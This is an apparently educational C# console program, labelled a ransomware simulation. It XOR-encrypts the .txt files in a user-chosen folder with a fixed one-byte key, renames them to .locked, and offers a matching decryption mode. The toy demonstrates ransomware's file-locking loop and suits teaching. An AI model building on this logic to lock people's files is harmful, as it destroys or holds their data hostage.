/*
 * PROJECT: Simple Ransomware Simulation
 * AUTHOR: [Senin Adın Yarennio]
 * PURPOSE: Educational demonstration of XOR encryption logic.
 * GITHUB: [GitHub https://github.com/Yarennio]
 */

using System;
using System.IO;

class Program
{
    static void Main()
    {
        Console.ForegroundColor = ConsoleColor.Cyan;
        Console.WriteLine("==============================================");
        Console.WriteLine("    SIMPLE RANSOMWARE SIMULATION TOOL v1.0    ");
        Console.WriteLine("          (EDUCATIONAL PURPOSE ONLY)          ");
        Console.WriteLine("==============================================");
        Console.ResetColor();

        // 1. INPUT: Hedef Klasör
        Console.Write("\nEnter target directory path (e.g., C:\\RansomTest): ");
        string targetFolder = Console.ReadLine();

        if (!Directory.Exists(targetFolder))
        {
            Console.ForegroundColor = ConsoleColor.Red;
            Console.WriteLine("[ERROR] Directory not found!");
            return;
        }

        // 2. INPUT: Mod Seçimi
        Console.WriteLine("\nSelect Operation Mode:");
        Console.WriteLine("[1] ENCRYPT Files (Lock)");
        Console.WriteLine("[2] DECRYPT Files (Unlock)");
        Console.Write("Choice (1 or 2): ");
        string choice = Console.ReadLine();

        byte key = 15; // XOR Key (Hardcoded for simulation)

        if (choice == "1")
        {
            PerformOperation(targetFolder, key, true); // Şifrele
        }
        else if (choice == "2")
        {
            PerformOperation(targetFolder, key, false); // Çöz
        }
        else
        {
            Console.WriteLine("Invalid choice.");
        }

        Console.WriteLine("\nPress any key to exit...");
        Console.ReadKey();
    }

    // Kod tekrarını önlemek için tek bir metot yazdık (Clean Code)
    static void PerformOperation(string folder, byte key, bool isEncrypting)
    {
        // Şifreliyorsak .txt ara, Çözüyorsak .locked ara
        string searchPattern = isEncrypting ? "*.txt" : "*.locked";
        string[] files = Directory.GetFiles(folder, searchPattern);

        if (files.Length == 0)
        {
            Console.WriteLine($"[INFO] No files found matching {searchPattern}");
            return;
        }

        Console.WriteLine($"\nProcessing {files.Length} files...");

        foreach (string filePath in files)
        {
            try
            {
                // 1. Oku
                byte[] fileBytes = File.ReadAllBytes(filePath);

                // 2. İşle (XOR)
                for (int i = 0; i < fileBytes.Length; i++)
                {
                    fileBytes[i] = (byte)(fileBytes[i] ^ key);
                }

                // 3. Yaz
                File.WriteAllBytes(filePath, fileBytes);

                // 4. İsim Değiştir
                string newName;
                if (isEncrypting)
                {
                    // Şifreleme: .txt -> .locked
                    newName = filePath + ".locked";
                }
                else
                {
                    // Çözme: .locked uzantısını sil -> .txt
                    newName = filePath.Replace(".locked", "");
                }

                File.Move(filePath, newName);

                Console.ForegroundColor = isEncrypting ? ConsoleColor.Red : ConsoleColor.Green;
                Console.WriteLine($"[SUCCESS] {Path.GetFileName(filePath)} -> {Path.GetFileName(newName)}");
                Console.ResetColor();
            }
            catch (Exception ex)
            {
                Console.WriteLine($"[ERROR] {ex.Message}");
            }
        }
        Console.WriteLine("\nOperation Completed.");
    }
}